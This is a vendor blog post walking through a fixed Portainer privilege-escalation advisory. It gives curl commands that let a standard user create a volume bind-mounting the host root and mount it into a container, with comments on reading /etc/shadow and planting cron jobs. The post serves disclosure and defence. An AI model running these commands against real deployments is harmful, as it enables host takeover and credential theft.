---
title: "Portainer Bind-Mount Bypass (GHSA-jmr9-98g4-2phv): A Command-by-Command Walkthrough"
slug: "portainer-bind-mount-bypass-ghsa-jmr9-98g4-2phv"
date: "2026-10-14"
author: "Shahid Parvez Hakim"
authorTitle: "Founder & CEO, BugB Technologies"
excerpt: "How a non-admin Portainer user could mount the host filesystem by wording a volume request a way the restriction check did not recognise — and exactly how Bravos found and proved it, step by step."
category: "research"
image: "https://e5bnabdufegbkfuq.public.blob.vercel-storage.com/blogs/portainer-bindmount/cover.png"
---

# Portainer Bind-Mount Bypass (GHSA-jmr9-98g4-2phv)

**Advisory:** [GHSA-jmr9-98g4-2phv](https://github.com/portainer/portainer/security/advisories/GHSA-jmr9-98g4-2phv) · **Severity:** Critical, CVSS 9.4 · **Fixed in:** Portainer 2.45.2

Portainer has a control, on by default, that stops a non-administrator from mounting folders from the **host machine** into their containers. That control mattered because Portainer talks to the Docker daemon with root-level access: if a standard user can mount the host's filesystem, they can read and change it, and from there take over the machine.

The control worked by recognising **one exact wording** of a mount request. Docker accepts other wordings that do the same thing. This post shows, command by command, how a standard user could reach the host by asking for the mount a way the check did not recognise — and how Bravos found it before anyone had to guess.

> This is a defensive write-up of a flaw Portainer has already fixed. Run it only against a copy of **Portainer 2.39.2** that you own and are authorised to test. Upgrade production to 2.45.2.

![Bravos maps the Docker proxy, then proves the bind-mount bypass on a running copy](https://e5bnabdufegbkfuq.public.blob.vercel-storage.com/blogs/portainer-bindmount/step-volume.png)

## The one fact that makes this critical

Portainer holds root-equivalent credentials for every environment it manages. So its API is a **higher-privilege surface than any user account**: a standard user is one authorization gap away from the Docker socket, and the Docker socket is root on the host. The bind-mount restriction is one of the controls standing between "standard user" and "root on the host".

## How Bravos found it

We did not start by poking the API by hand. We pointed **Bravos**, Bugb's whitebox pentest tool, at the Portainer 2.39.2 source.

1. **GuardLink** read the code and wrote a threat model into it — on this run, 4,606 files scanned and 881 annotations. It flagged the Docker proxy as a critical boundary and marked the volume- and container-creation paths where a standard user's input reaches the daemon, asking: *does the restriction actually cover every way to express a host mount?*
2. **CodeGraph** ranked those host-reaching paths to the top of the test list.
3. **Cert-X-Gen** then proved it on a running copy, as a real standard user. A finding only became "confirmed" when the running daemon actually mounted the host.

The key observation GuardLink surfaced: the restriction check, `CheckVolumeBodyRestrictions`, keys on the request *looking* like a bind mount. A `local` volume with driver options `type: none, o: bind, device: /` does not look like one to the check — but Docker treats it as a bind mount of host root all the same.

## Reproduce it, command by command

Assume a running Portainer 2.39.2, a standard (non-admin) user, and a Docker environment with id `1`. First, authenticate as the standard user and keep the token:

```bash
# 1. Log in as a standard, non-admin user
TOKEN=$(curl -s -X POST https://portainer.local/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"<alice-password>"}' | jq -r .jwt)
```

Now create a `local` volume whose driver options describe a bind of host root — worded as `type: none`, which the restriction check does not treat as a bind mount:

```bash
# 2. Create a volume that bind-mounts host "/" — passes CheckVolumeBodyRestrictions
curl -s -X POST "https://portainer.local/api/endpoints/1/docker/volumes/create" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
        "Name": "hostroot",
        "Driver": "local",
        "DriverOpts": { "type": "none", "o": "bind", "device": "/" }
      }'
# -> 201 Created. The restriction passed because DriverOpts.type is "none", not "bind".
```

The check looked for the obvious wording and waved this one through. The volume now points at the host's root filesystem.

![The standard user creates a container that mounts the host-root volume and reads /etc from the host](https://e5bnabdufegbkfuq.public.blob.vercel-storage.com/blogs/portainer-bindmount/step-mount.png)

Mount that volume into an ordinary container and you are reading and writing the host's files as a regular user:

```bash
# 3. Start a container with the host-root volume mounted at /host
curl -s -X POST "https://portainer.local/api/endpoints/1/docker/containers/create?name=probe" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
        "Image": "alpine",
        "Cmd": ["sleep","3600"],
        "HostConfig": { "Binds": ["hostroot:/host"] }
      }'

# 4. Start it, exec in, and the host filesystem is under /host
#    cat /host/etc/shadow, write a cron job, drop a key — this is host takeover.
```

Step 3 is the moment the flaw becomes real: the container comes up with the host's root directory mounted inside it. From there, reading `/host/etc/shadow` or writing into `/host/etc/cron.d` is ordinary file access — and it is root on the host.

## Why the control missed it

The restriction inspected the **shape** of the request — "is this spelled like a bind mount?" — instead of its **effect** — "does this end up mounting a host path?". Docker offers more than one spelling for the same outcome, so a shape check will always have a gap. Cert-X-Gen did not reason about that from the code; it submitted the alternate spelling to a running daemon and watched the host mount succeed. That is the difference between a suspicion and a confirmed finding.

## The fix and what to do

- **Upgrade to Portainer 2.45.2**, which carries the fix.
- On the 2.39.x LTS line, follow the advisory's workarounds until a fixed release is available.
- The engineering lesson is reusable: **validate what a request does, not how it is worded.** If a control recognises one exact request shape, enumerate the other shapes the backend accepts for the same effect.

## References

- Advisory: [GHSA-jmr9-98g4-2phv](https://github.com/portainer/portainer/security/advisories/GHSA-jmr9-98g4-2phv)
- Companion case study: [Two Portainer Advisories, found with Bravos](https://bugb.io/resources/case-studies/portainer-ssrf-bindmount)
- GuardLink and Cert-X-Gen are open source; Bravos orchestrates them.
